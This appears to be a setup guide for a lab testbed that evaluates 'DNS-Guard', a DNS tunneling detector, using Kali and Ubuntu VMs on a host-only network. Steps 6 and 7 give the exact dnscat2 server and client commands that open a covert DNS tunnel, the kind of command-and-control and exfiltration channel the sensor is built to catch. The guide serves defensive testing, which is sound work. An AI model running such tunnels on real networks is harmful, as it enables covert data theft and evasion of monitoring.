# DNS-Guard Lab Testbed Setup

**Use only inside the isolated host-only lab network. Do not expose dnscat2 or any
tunneling tool to the internet-facing (NAT) adapter.**

## Topology
Kali (192.168.56.20, client + attacker-sim) --> Ubuntu (192.168.56.10, dnsmasq resolver
+ DNS-Guard sensor) --> upstream DNS via Ubuntu's NAT adapter (benign traffic only)

Queries for *.tunnel.lab are redirected by dnsmasq straight to Kali's dnscat2 server,
simulating an attacker-controlled authoritative DNS server without leaving the lab.

## Steps
1. Apply ubuntu-netplan-template.yaml (edit interface names first), `sudo netplan apply`.
2. Set Kali's host-only adapter to 192.168.56.20/24, DNS server 192.168.56.10.
3. Install dnsmasq.conf.template as /etc/dnsmasq.conf on Ubuntu, restart dnsmasq.
4. Disable systemd-resolved on Ubuntu first (`sudo systemctl disable --now systemd-resolved`).
5. On Ubuntu: `sudo python3 main.py --iface enp0s8` (remember: change mitigation.py's
   chain from FORWARD to INPUT since Ubuntu IS the resolver endpoint here).
6. On Kali: `sudo dnscat2-server tunnel.lab`
7. On Kali (second terminal, or a third VM if available): `sudo dnscat2 tunnel.lab --dns server=192.168.56.10,port=53`
8. Generate benign traffic concurrently on Kali (browsing, apt update, curl).
9. Capture for repeatable evaluation: `sudo tcpdump -i enp0s8 udp port 53 -w lab_capture.pcap`
10. Replay anytime: `python3 main.py --pcap lab_capture.pcap`

## Safety notes
- Keep BLOCK_TTL_SECONDS short while tuning so a false positive doesn't lock out your own VM.
- Leave config.ENFORCE = False until thresholds are tuned on this lab's own benign baseline.
- Whitelist the lab's own infrastructure IPs/domains in config.py before testing.
